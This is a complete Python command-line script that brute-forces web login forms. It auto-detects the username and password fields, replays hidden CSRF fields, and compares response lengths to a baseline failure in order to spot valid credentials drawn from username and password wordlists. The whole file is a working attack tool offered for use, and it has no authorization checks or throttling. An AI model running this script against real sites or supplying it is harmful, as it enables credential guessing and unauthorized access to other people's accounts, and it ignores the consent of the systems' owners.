import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
import argparse
import sys

init(autoreset=True)
session = requests.Session()

def parse_args():
    parser = argparse.ArgumentParser(
        description="Bruteforce login form with automatic form parsing and CSRF handling."
    )
    parser.add_argument(
        "-u", "--url", required=True, help="Target login page URL (http or https)"
    )
    parser.add_argument(
        "-U", "--userlist", required=True, help="Username wordlist file"
    )
    parser.add_argument(
        "-P", "--passlist", required=True, help="Password wordlist file"
    )
    return parser.parse_args()

def load_wordlist(file_path):
    try:
        with open(file_path, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}[!] File not found: {file_path}")
        sys.exit(1)

def parse_login_form(url):
    r = session.get(url)
    soup = BeautifulSoup(r.text, "html.parser")

    form = soup.find("form")
    if not form:
        print(f"{Fore.RED}[!] No form found on page.")
        sys.exit(1)

    action = form.get("action") or url
    full_action_url = action if action.startswith("http") else requests.compat.urljoin(url, action)
    method = form.get("method", "post").lower()

    inputs = form.find_all("input")
    form_data = {}
    username_field = None
    password_field = None

    for i in inputs:
        name = i.get("name")
        input_type = i.get("type", "").lower()

        if not name:
            continue
        if input_type == "password" and not password_field:
            password_field = name
        elif input_type in ["text", "email"] and not username_field:
            username_field = name
        elif input_type == "hidden":
            form_data[name] = i.get("value", "")

    if not username_field or not password_field:
        print(f"{Fore.RED}[!] Could not auto-detect username/password fields.")
        print(f"{Fore.YELLOW}    - Detected hidden fields: {list(form_data.keys())}")
        sys.exit(1)

    return full_action_url, method, username_field, password_field, form_data

def get_failure_length(url, method, form_data, username_field, password_field):
    form_data[username_field] = "invaliduser"
    form_data[password_field] = "invalidpass"
    response = session.request(method, url, data=form_data)
    return len(response.content)

def main():
    args = parse_args()

    usernames = load_wordlist(args.userlist)
    passwords = load_wordlist(args.passlist)

    print(f"{Fore.YELLOW}[+] Target URL: {args.url}")
    print(f"{Fore.YELLOW}[+] Loaded {len(usernames)} usernames from {args.userlist}")
    print(f"{Fore.YELLOW}[+] Loaded {len(passwords)} passwords from {args.passlist}")

    submit_url, method, user_field, pass_field, base_data = parse_login_form(args.url)

    fail_len = get_failure_length(submit_url, method, base_data.copy(), user_field, pass_field)
    print(f"{Fore.YELLOW}[+] Detected form method={method.upper()} → {submit_url}")
    print(f"{Fore.YELLOW}[+] Using fields: username='{user_field}' password='{pass_field}'")
    print(f"{Fore.YELLOW}[+] Baseline failure content length: {fail_len}")
    print(f"{Fore.YELLOW}[+] Starting brute-force...\n")

    for username in usernames:
        for password in passwords:
            form_data = base_data.copy()
            form_data[user_field] = username
            form_data[pass_field] = password

            response = session.request(method, submit_url, data=form_data)
            length = len(response.content)

            if length != fail_len:
                print(f"{Fore.GREEN}[!!!] SUCCESS → {username}:{password} (Content-Length: {length})")
                return
            else:
                print(f"{Fore.CYAN}[-] Tried {username}:{password} (Length: {length})")

    print(f"{Fore.RED}[x] Bruteforce complete. No valid credentials found.")

if __name__ == "__main__":
    main()
